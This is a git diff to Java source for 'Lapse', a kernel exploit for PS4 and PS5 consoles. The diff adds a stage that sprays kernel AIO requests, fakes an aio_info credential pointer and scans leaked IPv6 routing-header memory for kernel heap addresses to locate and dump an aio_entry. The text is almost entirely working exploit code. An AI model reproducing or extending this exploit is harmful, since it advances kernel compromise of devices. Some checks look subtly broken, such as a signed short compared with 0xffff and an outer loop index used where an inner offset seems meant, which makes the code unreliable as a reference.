@@ -4,6 +4,8 @@
 
 package org.bdj.lapse;
 
+import java.io.StringWriter;
+
 /* Lapse is a kernel exploit for PS4 [5.00, 12.50) and PS5 [1.00-10.20) disclosed by an anonymous
  * developer ("abc") in 2025. Credit goes to abc for the proof-of-concept, Al-Azif for lapse.mjs,
  * and shahrilnet and znull_ptr for lapse.lua. BlueLapse primarily references the latter.
@@ -208,7 +210,7 @@ public class Lapse extends Thread {
 
 		Socket[] aliasSocketPair = new Socket[2];
 
-		final int NUM_RTHDR_ALIAS_TRIES = 100;
+		final int NUM_RTHDR_ALIAS_TRIES = 1000;
 		boolean aliasSocketPairFound = false;
 
 		for (int iTry = 0; iTry < NUM_RTHDR_ALIAS_TRIES; iTry++) {
@@ -217,13 +219,11 @@ public class Lapse extends Thread {
 				Socket socket = sockets[iSocket];
 				aliasRthdrBuf.putInt(markerOffset, iSocket);
 				// Does setsockopt actually need to be called with rthdrLen?
-				Console.log("-> socket " + socket.fd + " setsockopt IPV6_RTHDR");
 				socket.setOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, aliasRthdrBufAdjLen);
 			}
 			for (int iSocket = 0; iSocket < NUM_SOCKETS; iSocket++) {
 				Socket socket = sockets[iSocket];
 				// Why pass the full length here but not for setsockopt in 1st loop? Does it matter?
-				Console.log("-> socket " + socket.fd + " getsockopt IPV6_RTHDR");
 				socket.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, aliasRthdrBuf);
 				int marker = aliasRthdrBuf.getInt(markerOffset);
 				if (marker != iSocket) {
@@ -373,6 +373,128 @@ public class Lapse extends Thread {
 
 		long keLeakBufAddr = leakBuf.getLong(0x40) - 0x38;
 		Console.log("-> leaked kernel address of buffer: 0x" + Long.toHexString(keLeakBufAddr));
+
+		// 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
+		// Allocate reqs1 arrays at 0x100 malloc zone
+		final int NUM_ELEMS = 6;
+		AioRWRequestArray leakReqs = k.new AioRWRequestArray(NUM_ELEMS);
+		for (int i = 0; i < leakReqs.count; i++) { leakReqs.get(i).fd.set(-1); } // make_reqs1
+
+		// Use reqs1 to fake an aio_info. Set .ai_cred (offset 0x10) to offset 4 of the reqs2 so
+		// crfree(ai_cred) will harmlessly decrement the .ar2_ticket field
+		leakReqs.buffer.putLong(0x10, keLeakBufAddr + 4);
+
+		Console.log("-> find aio_entry");
+
+		final int NUM_FIND_AIO_ENTRY_TRIES = 100;
+		long reqs2Offset = 0;
+		AioSubmitIdArray leakIds = k.new AioSubmitIdArray(NUM_EVFS * NUM_ELEMS);
+
+		for (int i = 0; i < NUM_FIND_AIO_ENTRY_TRIES; i++) {
+			sd.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, leakBufRthdrSized);
+
+			// spray_aio
+			int idsOffset = 0, idsStep = NUM_ELEMS;
+			for (int j = 0; j < NUM_EVFS; j++) {
+				k.aioSubmitCmd(LibKernel.AIO_CMD_MULTI_WRITE, leakReqs, leakIds.slice(idsOffset, idsStep));
+				idsOffset += idsStep;
+			}
+
+			sd.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, leakBufRthdrSized);
+
+			for (int offset = 0x80; offset < leakBuf.size() - RTHDR_SIZE; offset++) {
+				// lapse.mjs calls this entire block verify_reqs2
+				if (leakBuf.getInt(offset) == LibKernel.AIO_CMD_WRITE) {
+					continue;
+				}
+
+				// We're looking for kernel heap addresses, which are prefixed with 0xffff_xxxx with
+				// xxxx randomized on boot.
+				short heapPrefix = 0;
+
+				// Check if offsets 0x10 to 0x20 look like a kernel heap address
+				boolean foundKernelHeapAddr = false;
+				for (int offset2 = 0x10; offset2 <= 0x20; offset2 += 8) {
+					if (leakBuf.getShort(offset + offset2 + 6) != 0xffff) {
+						foundKernelHeapAddr = false; // can stop looking
+						break;
+					}
+					heapPrefix = leakBuf.getShort(offset + offset2 + 4);
+					foundKernelHeapAddr = true;
+				}
+				if (!foundKernelHeapAddr) {
+					continue; // try verify_reqs2 with another offset
+				}
+
+				// Check reqs2.ar2_result.state. It's a 32-bit value but the allocated memory was
+				// initialized with zeroes so all padding bytes must be 0.
+				int state = leakBuf.getInt(offset + 0x38);
+				int padding = leakBuf.getInt(offset + 0x38 + 4);
+				if (!(0 < state && state <= 4) || padding != 0) {
+					continue; // try verify_reqs2 with another offset
+				}
+
+				// Check reqs2.ar2_file, must be NULL since we passed a bad fd to aio_submit_cmd
+				long file = leakBuf.getLong(offset + 0x40);
+				if (file != 0) {
+					continue; // try verify_reqs2 with another offset
+				}
+
+				// Check if offsets 0x48 to 0x50 look like a kernel address
+				foundKernelHeapAddr = false;
+				for (int offset2 = 0x48; offset2 <= 0x50; offset2 += 8) {
+					if (leakBuf.getShort(offset + offset2 + 6) == 0xffff) {
+						// Don't push kernel ELF addresses
+						if (leakBuf.getShort(offset + offset2 + 4) != 0xffff) {
+							if (leakBuf.getShort(offset + offset2 + 4) == heapPrefix) {
+								foundKernelHeapAddr = true;
+							}
+						}
+						// offset 0x48 can be NULL
+					} else if (i == 0x50 || leakBuf.getLong(offset + offset2) != 0) {
+						foundKernelHeapAddr = false;
+						break; // can stop looking
+					}
+				}
+				if (!foundKernelHeapAddr) {
+					continue; // try verify_reqs2 with another offset
+				}
+
+				reqs2Offset = offset;
+				break;
+			}
+
+			if (reqs2Offset == 0) {
+				continue; // next attempt
+			}
+
+			Console.log("-> found reqs2 at 0x" + Console.hex(leakBuf.address() + reqs2Offset) + " on attempt " + i);
+
+			// free_aios
+			try {
+				k.aioMultiCancel(leakIds, null);
+				k.aioMultiPoll(leakIds, null);
+				k.aioMultiDelete(leakIds, null);
+			} catch (Throwable e) {}
+		}
+
+		if (reqs2Offset == 0) {
+			Console.log("-> failed to find reqs2 after " + NUM_FIND_AIO_ENTRY_TRIES + " attempts");
+			return;
+		}
+
+		sd.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, leakBufRthdrSized);
+		Console.log("-> leaked aio_entry:");
+		for (int offset = 0; offset <= 0x80; offset += 16) {
+			StringWriter sw = new StringWriter();
+			for (int i = 0; i < 16; i++) {
+				String hex = Console.hex(leakBuf.getByte(offset + i));
+				if (hex.length() == 1) { sw.write('0'); }
+				sw.write(hex);
+				sw.write(' ');
+			}
+			Console.log("-> " + sw.toString());
+		}
 
 		Console.log("Lapse: end of PoC");
 	}
